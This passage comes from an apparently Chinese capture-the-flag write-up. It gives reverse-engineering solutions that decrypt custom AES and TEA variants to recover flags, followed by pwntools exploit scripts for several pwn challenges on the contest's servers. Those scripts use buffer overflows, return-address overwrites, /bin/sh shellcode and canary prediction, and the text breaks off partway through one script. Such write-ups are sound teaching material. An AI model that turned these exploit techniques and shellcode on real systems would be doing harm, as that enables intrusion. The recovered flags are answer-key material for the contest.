class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    y[k] = S_inv[y[k]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    y[k] ^= v18[k]</span><br><span class="line">    y[k+<span class="number">16</span>] ^= v18[k]</span><br><span class="line">    </span><br><span class="line">y = untransform(y[:<span class="number">16</span>])+untransform(y[<span class="number">16</span>:])</span><br><span class="line">y = unShiftRow(y[:<span class="number">16</span>])+unShiftRow(y[<span class="number">16</span>:])</span><br><span class="line">y = [S_inv[y[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;0.o_Thls_1s_n0t_A3s_(q^_^p)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h3><blockquote><p>喂！三点几啦！饮茶先啦！ (flag需要包上SYC{}提交)</p></blockquote><p>在MainActivity中查看逻辑为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">obj 补足24位 X</span><br><span class="line">sb4 = sb2 = obj 偶数位</span><br><span class="line">sb5 = sb3 = obj 奇数位</span><br><span class="line">4位一组</span><br><span class="line">a|b|c|d -&gt; 整数</span><br><span class="line"></span><br><span class="line">key = [2023708229, -158607964, -2120859654, 1167043672]</span><br><span class="line"></span><br><span class="line">v0,v1,v2=m[0],m[1],m[2]</span><br><span class="line">for i in range(32):</span><br><span class="line">    x+=0x9e3779b9</span><br><span class="line">v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1)</span><br><span class="line">v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3)</span><br><span class="line">m[0]=v0</span><br><span class="line">for i in range(32):</span><br><span class="line">    x+=0x9e3779b9</span><br><span class="line">v2 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1)</span><br><span class="line">v1 += ((v2 &lt;&lt; 4) + k2) ^ (v2 + x) ^ ((v2 &gt;&gt; 5) + k3)</span><br><span class="line">m[1]=v2</span><br><span class="line">m[0]=v1</span><br></pre></td></tr></table></figure><p>加密逻辑为魔改TEA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0,v1,v2 = v[<span class="number">0</span>],v[<span class="number">1</span>],v[<span class="number">2</span>]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0,k1,k2,k3 = k[<span class="number">0</span>],k[<span class="number">1</span>],k[<span class="number">2</span>],k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        x += delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        x += delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v2 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v2 = v2 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 += ((v2 &lt;&lt; <span class="number">4</span>) + k2) ^ (v2 + x) ^ ((v2 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">1</span>] = v2</span><br><span class="line">    v[<span class="number">2</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;abcdefghijkl&#x27;</span></span><br><span class="line">m = [bytes_to_long(m[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">key = [<span class="number">2023708229</span>, -<span class="number">158607964</span>, -<span class="number">2120859654</span>, <span class="number">1167043672</span>]</span><br><span class="line">key = [k &amp; <span class="number">0xffffffff</span> <span class="keyword">for</span> k <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">c = encrypt(m, key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">cc = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k))</span><br><span class="line"><span class="built_in">print</span>(cc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bArr = bArr2 = cc = &#x27;a5f892c9cf4b730db48f6650&#x27;</span></span><br><span class="line"><span class="comment"># ad@#E!@a123 = sb5</span></span><br><span class="line"><span class="comment"># eCAS213@!@3 = bArr</span></span><br></pre></td></tr></table></figure><p>带符号解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(<span class="type">int</span>* v, <span class="type">int</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">2</span>],v2=v[<span class="number">1</span>], sum=(<span class="number">-1640531527</span>)*<span class="number">64</span>, i;</span><br><span class="line">    <span class="type">int</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">int</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v2&lt;&lt;<span class="number">4</span>) + k2) ^ (v2 + sum) ^ ((v2&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v2 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1; v[<span class="number">2</span>]=v2;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v[<span class="number">3</span>]=&#123;<span class="number">2784531145</span>, <span class="number">3477828365</span>, <span class="number">3029296720</span>&#125;;</span><br><span class="line"><span class="type">int</span> k[<span class="number">4</span>]=&#123;<span class="number">2023708229</span>, <span class="number">-158607964</span>, <span class="number">-2120859654</span>, <span class="number">1167043672</span>&#125;;</span><br><span class="line">    decrypt(&amp;v, k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x%x%x&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>],v[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//543056743333546e30697472</span></span><br><span class="line"><span class="comment">//T0Vt33Tn0itr</span></span><br></pre></td></tr></table></figure><p>在MainActivity2中查看逻辑为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iArr=[-107, -106, -95, -115, -119, 127, 26, 121, -62, -20, 86, 9] = &#x27;9596a18d897f1a79c2ec5609&#x27;</span><br><span class="line"></span><br><span class="line">bytes = ad@#E!@a123 = sb5</span><br><span class="line">byteArrayExtra = eCAS213@!@3 = bArr</span><br><span class="line"></span><br><span class="line">byteArrayExtra ^ bytes = iArr</span><br><span class="line"></span><br><span class="line">故 bytes = &#x27;0n3DF4itvc0Y&#x27;</span><br></pre></td></tr></table></figure><p>合并得到flag：<code>SYC&#123;T00nV3tD3F34Tint0vict0rY&#125;</code></p><p>​    </p><h3 id="是男人就来扎针"><a href="#是男人就来扎针" class="headerlink" title="是男人就来扎针"></a>是男人就来扎针</h3><blockquote><p>简单的游戏逆向送分题,最终flag记得包裹上SYC{}</p></blockquote><p>ILSPY反编译，在 <code>public class GameManager</code> 找到代码逻辑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">magicc = [<span class="number">75</span>, <span class="number">109</span>, <span class="number">102</span>, <span class="number">63</span>, <span class="number">107</span>, <span class="number">112</span>, <span class="number">63</span>, <span class="number">108</span>, <span class="number">124</span>, <span class="number">112</span>,</span><br><span class="line"><span class="number">109</span>, <span class="number">122</span>, <span class="number">63</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">63</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">118</span>, <span class="number">113</span>,</span><br><span class="line"><span class="number">107</span>, <span class="number">108</span>, <span class="number">62</span>]</span><br><span class="line"></span><br><span class="line">magic = [<span class="number">124</span>, <span class="number">90</span>, <span class="number">81</span>, <span class="number">8</span>, <span class="number">92</span>, <span class="number">71</span>, <span class="number">8</span>, <span class="number">90</span>, <span class="number">77</span>, <span class="number">73</span>,</span><br><span class="line"><span class="number">75</span>, <span class="number">64</span>, <span class="number">8</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">8</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">65</span>,</span><br><span class="line"><span class="number">70</span>, <span class="number">92</span>, <span class="number">91</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    magicc = [magicc[k] ^ (i+<span class="number">1</span>) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(magicc))]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(magicc))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    magic = [magic[k] ^ (i+<span class="number">1</span>) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(magicc))]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(magic))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m = hashlib.md5(<span class="built_in">bytes</span>(magicc)).hexdigest().upper()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># CBDDD133B60130856D3C695D9E5ED6A5</span></span><br></pre></td></tr></table></figure><p>flag：<code>SYC&#123;CBDDD133B60130856D3C695D9E5ED6A5&#125;</code></p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="nc-pwntools"><a href="#nc-pwntools" class="headerlink" title="nc_pwntools"></a>nc_pwntools</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30348</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;!!!\n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">92</span>+<span class="string">b&#x27;Syclover&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;first one\n&#x27;</span>)</span><br><span class="line">exp=r.recvline().strip()[:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(exp)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(exp)).encode())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>概率性getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30941</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(<span class="number">0x4012F3</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>开了PIE，概率性getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31277</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+<span class="string">b&#x27;\x27\x12&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="write1"><a href="#write1" class="headerlink" title="write1"></a>write1</h3><p>按字节修改返回地址为后门函数 <code>backdoor()</code> 地址，修改2个字节即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31467</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;abcdefghi&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x40134d -&gt; 0x401225</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 0x68-0x40=40</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;value:&#x27;</span>)</span><br><span class="line"><span class="comment"># (0x25-0x4d)&amp;0xffffffff=0xffffffd8</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;ffffffd8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 0x68+1-0x40=41</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;41&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;value:&#x27;</span>)</span><br><span class="line"><span class="comment"># (0x12-0x13)&amp;0xffffffff=0xffffffff</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;ffffffff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>（代码待补充）</p><p>​    </p><h3 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h3><blockquote><p>先做这题，简单</p></blockquote><p>（代码待补充）</p><p>​    </p><h3 id="write2"><a href="#write2" class="headerlink" title="write2"></a>write2</h3><p>栈地址泄露，栈可写，写24长度内的shellcode，while循环改写retaddr为栈地址，ret2shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31581</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">stack_leak=<span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">pl=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">shell_addr=stack_leak+<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">40</span>+i).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;value:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">hex</span>(shell_addr&gt;&gt;(<span class="number">8</span>*i)&amp;<span class="number">0xff</span>)[<span class="number">2</span>:].encode())</span><br><span class="line">    </span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="fmt1-0"><a href="#fmt1-0" class="headerlink" title="fmt1.0"></a>fmt1.0</h3><p>（代码待补充）</p><p>​    </p><h3 id="white-canary"><a href="#white-canary" class="headerlink" title="white_canary"></a>white_canary</h3><blockquote><p>远程之前记得“sudo ntpdate cn.pool.ntp.org” 同步下时间</p></blockquote><p><code>init()</code> 自己实现了canary计算方法，禁用了59，无法 <code>execve</code>。</p><p>伪随机数算canary+写orw的shellcode+ret2shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31600</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seed=libc.time(<span class="number">0</span>)%<span class="number">60</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line">v2 = libc.rand()</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">canary = (((v2 &gt;&gt; <span class="number">4</span>) ^ (<span class="number">16</span> * v3 + (v3 &gt;&gt; <span class="number">8</span>) * (v2 &lt;&lt; <span class="number">8</span>))) &gt;&gt; <span class="number">32</span>) \</span><br><span class="line">  + ((((v2 &gt;&gt; <span class="number">48</span>) + (v2 &lt;&lt; <span class="number">16</span>) * (v3 &gt;&gt; <span class="number">16</span>)) ^ (v3 &lt;&lt; <span class="number">48</span>)) &lt;&lt; <span class="number">32</span>)</span><br><span class="line">  </span><br><span class="line">canary&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">someplace=<span class="number">0x404080</span></span><br><span class="line">pl=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>))</span><br><span class="line">pl+=asm(shellcraft.read(<span class="number">3</span>, someplace, <span class="number">0x20</span>))</span><br><span class="line">pl+=asm(shellcraft.write(<span class="number">1</span>, someplace, <span class="number">0x20</span>))</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">buf=<span class="number">0x4040E0</span></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(buf)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ez-fullprotection"><a href="#ez-fullprotection" class="headerlink" title="ez_fullprotection"></a>ez_fullprotection</h3><p>scanf泄露_start地址绕PIE，线程溢出TLS覆盖canary。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30161</span>)</span><br><span class="line">elf=ELF(<span 